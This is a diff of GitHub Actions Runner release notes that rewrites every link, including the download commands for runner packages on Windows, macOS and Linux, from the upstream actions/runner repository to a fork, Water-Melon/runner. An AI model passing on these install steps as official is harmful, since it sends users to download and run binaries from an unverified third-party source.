@@ -1,20 +1,20 @@
 ## What's Changed
-* Update Docker to v28.3.2 and Buildx to v0.26.1 by @github-actions[bot] in https://github.com/actions/runner/pull/3953
-* Fix if statement structure in update script and variable reference by @salmanmkc in https://github.com/actions/runner/pull/3956
-* Add V2 flow for runner deletion by @Samirat in https://github.com/actions/runner/pull/3954
-* Node 20 -> Node 24 migration feature flagging, opt-in and opt-out environment variables by @salmanmkc in https://github.com/actions/runner/pull/3948
-* Update Node20 and Node24 to latest by @djs-intel in https://github.com/actions/runner/pull/3972
-* Redirect supported OS doc section to current public Docs location by @corycalahan in https://github.com/actions/runner/pull/3979
-* Bump Microsoft.NET.Test.Sdk from 17.13.0 to 17.14.1 by @dependabot[bot] in https://github.com/actions/runner/pull/3975
-* Bump Azure.Storage.Blobs from 12.24.0 to 12.25.0 by @dependabot[bot] in https://github.com/actions/runner/pull/3974
-* Bump actions/download-artifact from 4 to 5 by @dependabot[bot] in https://github.com/actions/runner/pull/3973
-* Bump actions/checkout from 4 to 5 by @dependabot[bot] in https://github.com/actions/runner/pull/3982
+* Update Docker to v28.3.2 and Buildx to v0.26.1 by @github-actions[bot] in https://github.com/Water-Melon/runner/pull/3953
+* Fix if statement structure in update script and variable reference by @salmanmkc in https://github.com/Water-Melon/runner/pull/3956
+* Add V2 flow for runner deletion by @Samirat in https://github.com/Water-Melon/runner/pull/3954
+* Node 20 -> Node 24 migration feature flagging, opt-in and opt-out environment variables by @salmanmkc in https://github.com/Water-Melon/runner/pull/3948
+* Update Node20 and Node24 to latest by @djs-intel in https://github.com/Water-Melon/runner/pull/3972
+* Redirect supported OS doc section to current public Docs location by @corycalahan in https://github.com/Water-Melon/runner/pull/3979
+* Bump Microsoft.NET.Test.Sdk from 17.13.0 to 17.14.1 by @dependabot[bot] in https://github.com/Water-Melon/runner/pull/3975
+* Bump Azure.Storage.Blobs from 12.24.0 to 12.25.0 by @dependabot[bot] in https://github.com/Water-Melon/runner/pull/3974
+* Bump actions/download-artifact from 4 to 5 by @dependabot[bot] in https://github.com/Water-Melon/runner/pull/3973
+* Bump actions/checkout from 4 to 5 by @dependabot[bot] in https://github.com/Water-Melon/runner/pull/3982
 
 ## New Contributors
-* @Samirat made their first contribution in https://github.com/actions/runner/pull/3954
-* @djs-intel made their first contribution in https://github.com/actions/runner/pull/3972
+* @Samirat made their first contribution in https://github.com/Water-Melon/runner/pull/3954
+* @djs-intel made their first contribution in https://github.com/Water-Melon/runner/pull/3972
 
-**Full Changelog**: https://github.com/actions/runner/compare/v2.327.1...v2.328.0
+**Full Changelog**: https://github.com/Water-Melon/runner/compare/v2.327.1...v2.328.0
 
 _Note: Actions Runner follows a progressive release policy, so the latest release might not be available to your enterprise, organization, or repository yet.
 To confirm which version of the Actions Runner you should expect, please view the download instructions for your enterprise, organization, or repository.
@@ -30,7 +30,7 @@ The following snipped needs to be run on `powershell`:
 # Create a folder under the drive root
 mkdir \actions-runner ; cd \actions-runner
 # Download the latest runner package
-Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-win-x64-<RUNNER_VERSION>.zip -OutFile actions-runner-win-x64-<RUNNER_VERSION>.zip
+Invoke-WebRequest -Uri https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-win-x64-<RUNNER_VERSION>.zip -OutFile actions-runner-win-x64-<RUNNER_VERSION>.zip
 # Extract the installer
 Add-Type -AssemblyName System.IO.Compression.FileSystem ;
 [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD\actions-runner-win-x64-<RUNNER_VERSION>.zip", "$PWD")
@@ -46,7 +46,7 @@ The following snipped needs to be run on `powershell`:
 # Create a folder under the drive root
 mkdir \actions-runner ; cd \actions-runner
 # Download the latest runner package
-Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-win-arm64-<RUNNER_VERSION>.zip -OutFile actions-runner-win-arm64-<RUNNER_VERSION>.zip
+Invoke-WebRequest -Uri https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-win-arm64-<RUNNER_VERSION>.zip -OutFile actions-runner-win-arm64-<RUNNER_VERSION>.zip
 # Extract the installer
 Add-Type -AssemblyName System.IO.Compression.FileSystem ;
 [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD\actions-runner-win-arm64-<RUNNER_VERSION>.zip", "$PWD")
@@ -58,7 +58,7 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem ;
 # Create a folder
 mkdir actions-runner && cd actions-runner
 # Download the latest runner package
-curl -O -L https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-osx-x64-<RUNNER_VERSION>.tar.gz
+curl -O -L https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-osx-x64-<RUNNER_VERSION>.tar.gz
 # Extract the installer
 tar xzf ./actions-runner-osx-x64-<RUNNER_VERSION>.tar.gz
 ```
@@ -69,7 +69,7 @@ tar xzf ./actions-runner-osx-x64-<RUNNER_VERSION>.tar.gz
 # Create a folder
 mkdir actions-runner && cd actions-runner
 # Download the latest runner package
-curl -O -L https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-osx-arm64-<RUNNER_VERSION>.tar.gz
+curl -O -L https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-osx-arm64-<RUNNER_VERSION>.tar.gz
 # Extract the installer
 tar xzf ./actions-runner-osx-arm64-<RUNNER_VERSION>.tar.gz
 ```
@@ -80,7 +80,7 @@ tar xzf ./actions-runner-osx-arm64-<RUNNER_VERSION>.tar.gz
 # Create a folder
 mkdir actions-runner && cd actions-runner
 # Download the latest runner package
-curl -O -L https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-x64-<RUNNER_VERSION>.tar.gz
+curl -O -L https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-x64-<RUNNER_VERSION>.tar.gz
 # Extract the installer
 tar xzf ./actions-runner-linux-x64-<RUNNER_VERSION>.tar.gz
 ```
@@ -91,7 +91,7 @@ tar xzf ./actions-runner-linux-x64-<RUNNER_VERSION>.tar.gz
 # Create a folder
 mkdir actions-runner && cd actions-runner
 # Download the latest runner package
-curl -O -L https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-arm64-<RUNNER_VERSION>.tar.gz
+curl -O -L https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-arm64-<RUNNER_VERSION>.tar.gz
 # Extract the installer
 tar xzf ./actions-runner-linux-arm64-<RUNNER_VERSION>.tar.gz
 ```
@@ -102,7 +102,7 @@ tar xzf ./actions-runner-linux-arm64-<RUNNER_VERSION>.tar.gz
 # Create a folder
 mkdir actions-runner && cd actions-runner
 # Download the latest runner package
-curl -O -L https://github.com/actions/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-arm-<RUNNER_VERSION>.tar.gz
+curl -O -L https://github.com/Water-Melon/runner/releases/download/v<RUNNER_VERSION>/actions-runner-linux-arm-<RUNNER_VERSION>.tar.gz
 # Extract the installer
 tar xzf ./actions-runner-linux-arm-<RUNNER_VERSION>.tar.gz
 ```
